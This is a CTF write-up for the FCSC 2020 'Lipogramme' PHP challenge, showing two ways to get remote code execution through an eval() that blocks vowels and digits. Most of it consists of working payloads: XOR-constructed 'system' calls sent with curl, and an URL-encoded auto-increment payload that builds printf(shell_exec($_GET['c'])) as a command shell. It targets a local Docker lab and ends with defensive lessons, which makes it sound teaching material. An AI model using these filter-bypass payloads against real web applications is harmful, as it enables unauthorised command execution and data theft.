# Lipogramme PHP ‚Äì RCE Without Vowels (CTF Writeup)

> Remote Code Execution in a PHP app that forbids **vowels** and **digits** in user input.

Author: **AmrDroid**

---

## üß© Challenge Description

The service runs on:

```text
http://localhost:8000/
```

Visiting it without parameters shows us the source code:

```php
<?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away!');
            }
        }
    } else {
        show_source(__FILE__);
    }
```

So the logic is:

1. Read `$_GET['code']` (up to 250 chars).
2. If `code` contains any vowel or any digit ‚Üí `No way! Go away!`.
3. Otherwise ‚Üí `eval($code)`.
4. If `eval` throws a `ParseError` ‚Üí also `No way! Go away!`.
5. Without `code` ‚Üí show the source.

The goal: **achieve RCE via `eval` despite the character filter** and recover a flag hidden somewhere in the webroot.

---

## üîç Filter Analysis

The filter is:

```php
preg_match('/a|e|i|o|u|y|[0-9]/i', $code)
```

### ‚ùå Blocked (case-insensitive)

- Vowels: `a e i o u y`
- Digits: `0 1 2 3 4 5 6 7 8 9`

So this is illegal in `code=`:

```php
system("ls");      // contains e, i
print(123);        // contains i and digits
echo "hello";      // contains e, o
```

### ‚úÖ Allowed

- Consonants:  
  `b c d f g h j k l m n p q r s t v w x z` (upper + lower)
- Symbols (non-exhaustive):  
  `! @ # $ % ^ & * ( ) - _ = + [ ] { } ; : ' " , . / ? \` < >|`
- PHP syntax using only those characters:
  - variables: `$x`, `$fn`, `$cmd`, ‚Ä¶
  - concatenation: `.`
  - bitwise ops: `^`, `&`, `|`
  - function calls (as long as you can spell them without vowels)

**Important:**  

The filter looks at the **literal text** of `code`, not at the values computed at runtime.  
So if we can generate forbidden characters (like vowels or spaces) dynamically using allowed characters (e.g. XOR), the filter will never see them.

---

## üß™ First Steps ‚Äì Understanding Behavior

Because of:

```php
try {
    eval($code);
} catch (ParseError $e) {
    die('No way! Go away!');
}
```

We see `No way! Go away!` for two reasons:

1. Filter matched (vowel/digit).
2. `eval()` got invalid PHP code.

So:

- `No way! Go away!` ‚â† ‚Äúfilter only‚Äù
- It can also mean ‚Äúsyntax error‚Äù

### ‚úÖ Example: valid, consonant-only PHP

```text
?code=$x=$x;
```

- No vowels, no digits ‚Üí passes regex.
- Valid PHP ‚Üí no `ParseError`.
- No output ‚Üí blank page.

This confirms:

- Our input reaches `eval`.
- We can execute arbitrary PHP, as long as it is syntactically valid and vowel/digit-free **in the source**.

---

## üß† High-Level Exploit Strategy

What we *want* to run (conceptually):

```php
system("ls -a");
system("cat ./.*");
```

But we cannot type:

- `system` (contains `e`, `y`)
- `ls -a` (contains `a`)
- `cat` (contains `a`)
- digits (no `chr(97)` style tricks)

So the plan:

1. **Build forbidden strings at runtime** using allowed characters.
2. Use those strings as:
   - function names (`"system"`)
   - command strings (`"ls -a"`, `"cat ./.*"`)
3. Call the function via a variable:

   ```php
   $fn($cmd); // e.g., system("ls -a")
   ```

---

## üß∑ Key Primitive: String XOR in PHP

PHP lets us XOR strings:

```php
"H" ^ ";"
```

This XORs the ASCII codes of each character and returns a new character.

Example logic:

- `"H"` = 72
- `";"` = 59
- `72 ^ 59 = 115`
- `115` = `'s'`

So:

```php
"H"^";"  // "s"
```

By carefully choosing pairs of allowed characters, we can generate:

- vowels (`a, e, i, o, u, y`)
- spaces
- punctuation
- any other ASCII characters

The **filter sees only the input** (e.g., `"H"` and `";"`), which are allowed.  
The XOR result is computed later, out of the filter‚Äôs reach.

---

## üß± Method 1 ‚Äì XOR-Based RCE with `system`

### Step 1 ‚Äì Build `"system"` via XOR (original version)

We can build `system` fully by XOR:

```php
$fn = ("H"^";").("B"^";").("H"^";").("H"^"<").("D"^"!").("B"^"/");
```

Decoded:

| Expression  | Char |
|-------------|------|
| `"H"^";"`   | `s`  |
| `"B"^";"`   | `y`  |
| `"H"^";"`   | `s`  |
| `"H"^"<"`   | `t`  |
| `"D"^"!""`  | `e`  |
| `"B"^"/"`   | `m`  |

So:

```php
$fn = "s" . "y" . "s" . "t" . "e" . "m";  // "system"
```

At runtime, `$fn` contains the string `"system"`. PHP allows:

```php
$fn($cmd);  // calls system($cmd)
```

even though the filter never saw the word `system`.

---

### Step 2 ‚Äì Build `"ls -a"` via XOR

To list all files (including hidden ones):

```text
ls -a
```

We can construct this as:

```php
$cmd = ("B"^".").("H"^";").("z"^"Z").("{"^"V").("#"^"B");
```

Decoded:

| Expression  | Char |
|-------------|------|
| `"B"^"."`   | `l`  |
| `"H"^";"`   | `s`  |
| `"z"^"Z"`   | ` ` (space) |
| `"{"^"V"`   | `-`  |
| `"#"^"B"`   | `a`  |

So:

```php
$cmd = "l" . "s" . " " . "-" . "a";  // "ls -a"
```

Now:

```php
$fn  = "system";
$cmd = "ls -a";
$fn($cmd);  // system("ls -a");
```

### Payload: run `ls -a`

```bash
curl 'http://localhost:8000/'   --get   --data-urlencode 'code=$fn=("H"^";").("B"^";").("H"^";").("H"^"<").("D"^"!").("B"^"/");$cmd=("B"^".").("H"^";").("z"^"Z").("{"^"V").("#"^"B");$fn($cmd);'
```

Example output:

```text
.
..
index.php
.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
```

We‚Äôve now discovered a hidden file in the webroot that most likely contains the flag.

---

### Step 3 ‚Äì Build `"cat ./.*"` ‚Äì Simplified Payload

We want to read hidden files in the current directory:

```text
cat ./.*
```

We **don‚Äôt** need to XOR everything.  
The filter only cares about vowels and digits, so we *only* need to hide `a` and the space.

Characters status:

- Need XOR: `a`, space
- Allowed directly: `c`, `t`, `.`, `/`, `*`

A simple way to build the command:

```php
$cmd = "c".("#"^"B")."t"." ./.*";
```

Explanation:

- `"c"` ‚Üí `c` (allowed)
- `"#"^"B"` ‚Üí `a`
- `"t"` ‚Üí `t` (allowed)
- `" ./.*"` ‚Üí space + `./.*` (no vowels, fully allowed)

At runtime this becomes:

```php
$cmd = "cat ./.*";
```

For the function name, we can also simplify `system` a bit: we only need XOR where vowels appear (`y`, `e`):

```php
$fn = "s".("B"^";")."s"."t".("D"^"!")."m";
```

- `"s"` ‚Üí `s`
- `("B"^";")` ‚Üí `y`
- `"s"` ‚Üí `s`
- `"t"` ‚Üí `t`
- `("D"^"!")` ‚Üí `e`
- `"m"` ‚Üí `m`

So:

```php
$fn = "system";
```

‚úÖ This is much shorter and still obeys the filter.

### ‚úÖ Final ‚Äújust type it‚Äù payload (cat all hidden files)

We can now use this cleaner payload in one shot:

```bash
curl 'http://localhost:8000/'   --get   --data-urlencode 'code=$fn="s".("B"^";")."s"."t".("D"^"!")."m";$cmd="c".("#"^"B")."t"." ./.*";$fn($cmd);'
```

This executes:

```php
system("cat ./.*");
```

and prints the content of the hidden flag file:

```text
.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
```

So with this payload:

- We only XOR when we **really need to** (vowels + spaces).
- Everything else is typed directly, making the exploit shorter and easier to read.

---

## üßæ Method 2 ‚Äì Auto-Increment Trick (`Array` ‚Üí vowels ‚Üí `shell_exec`)

There is also a **different method**, inspired by the well-known ‚Äúwebshell without numbers/letters‚Äù technique.

> Original French writeup idea (lrstx): start from `"Array"`, then use string auto-increment and indexing to generate vowels and rebuild `shell_exec`, `$_GET`, and `printf`.

### Step 1 ‚Äì Get `"Array"` and extract `"A"`

```php
$_ = [];        // an empty array
$_ = @"$_";     // converting array to string ‚Üí "Array"
$z = $_['!'=='@']; // '!'=='@' is false ‚Üí index 0 ‚Üí first char: "A"
```

Now:

```php
$z = "A";
```

### Step 2 ‚Äì Auto-increment to get `"E"` and `"I"`

```php
$d = $z;
$d++;$d++;$d++;$d++;  // A ‚Üí B ‚Üí C ‚Üí D ‚Üí E

$h = $d;
$h++;$h++;$h++;$h++;  // E ‚Üí F ‚Üí G ‚Üí H ‚Üí I
```

Now we have:

- `$d = "E"`
- `$h = "I"`

Both created **without ever typing `E` or `I`** in the source.

### Step 3 ‚Äì Rebuild function and variable names

Use these vowels inside double-quoted strings:

```php
$s = "sh${d}ll_${d}x${d}c"; // "shEll_ExEc" ‚Üí shell_exec
$G = "_G{$d}T";             // "_GET"
$GG = $$G;                  // $_GET (variable variable)
$p = "pr${h}ntf";           // "prIntf" ‚Üí printf
```

At runtime:

- `$s` ‚Üí `"shell_exec"`
- `$GG` ‚Üí `$_GET`
- `$p` ‚Üí `"printf"`

### Step 4 ‚Äì Execute a command from `$_GET['c']`

Finally:

```php
$p($s($GG['c']));
```

becomes:

```php
printf(shell_exec($_GET['c']));
```

So any shell command we pass in `c=` will be executed and printed.

### One-line URL-encoded payload

All of that logic can be squeezed into a single `code` parameter (URL-encoded):

```text
%24_%3D[]%3B%24_%3D%40"%24_"%3B%24z%3D%24_['!'%3D%3D'%40']%3B%24d%3D%24z%3B%24d%2B%2B%3B%24d%2B%2B%3B%24d%2B%2B%3B%24d%2B%2B%3B%24h%3D%24d%3B%24h%2B%2B%3B%24h%2B%2B%3B%24h%2B%2B%3B%24h%2B%2B%3B%24s%3D"sh%24{d}ll_%24{d}x%24{d}c"%3B%24G%3D"_G{%24d}T"%3B%24GG%3D%24%24G%3B%24p%3D"pr%24{h}ntf"%3B%24p(%24s(%24GG['c']))%3B
```

We can now simply add a `c` parameter with any command we want to execute.

### Example: run `ls -al`

```text
http://localhost:8000/?code=%24_%3D[]%3B%24_%3D%40"%24_"%3B%24z%3D%24_['!'%3D%3D'%40']%3B%24d%3D%24z%3B%24d%2B%2B%3B%24d%2B%2B%3B%24d%2B%2B%3B%24d%2B%2B%3B%24h%3D%24d%3B%24h%2B%2B%3B%24h%2B%2B%3B%24h%2B%2B%3B%24h%2B%2B%3B%24s%3D"sh%24{d}ll_%24{d}x%24{d}c"%3B%24G%3D"_G{%24d}T"%3B%24GG%3D%24%24G%3B%24p%3D"pr%24{h}ntf"%3B%24p(%24s(%24GG['c']))%3B&c=ls%20-al
```

At runtime this becomes:

```php
printf(shell_exec("ls -al"));
```

and prints the directory listing.

From there:

- Use `&c=cat%20.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php`
- The flag is printed.

---

## ‚úÖ Summary of Both Methods

- **Method 1 (XOR + system)**  
  - Use XOR to generate only the **vowels** and **spaces** you need.
  - Keep consonants and punctuation as raw characters.
  - Build `"system"` and `"cat ./.*"` dynamically.
  - Call `system($cmd)` via a variable function.

- **Method 2 (Array + auto-increment + shell_exec)**  
  - Abuse PHP‚Äôs `"Array"` string and string auto-increment to generate vowels.
  - Rebuild `shell_exec`, `$_GET`, and `printf` dynamically.
  - Execute `printf(shell_exec($_GET['c']))` and pass the real command in `c`.

Both methods bypass the ‚Äúno vowels, no digits‚Äù filter and reach full RCE via `eval()`.

---

## üö® Lessons Learned

- **Never use `eval()` on user input.**  
  Even with ‚Äúsmart‚Äù filters, it‚Äôs basically RCE waiting to happen.
- **Blacklisting characters is not a safe sandbox.**  
  As long as bitwise operators and basic syntax are available, you can almost always reconstruct forbidden bytes.
- **Runtime vs. source:**  
  The filter sees what you type, not what PHP computes. Think in terms of:
  > ‚ÄúCan I *make* the value I want *later*?‚Äù
- **XOR and auto-increment tricks are powerful** in CTFs where some characters are restricted.

---

## üß™ Optional: Running the Challenge Locally

If you want to reproduce the environment with Docker (as in FCSC 2020):

```bash
docker run -d   -p 8000:80   --name lipogramme   anssi/fcsc2020-web-lipogrammeurs:latest
```

Then visit:

```text
http://localhost:8000/
```

And launch any of the payloads shown above.

---

Happy hacking üöÄ  
Feel free to fork this repo and adapt these techniques to other ‚Äúrestricted charset‚Äù CTF challenges.
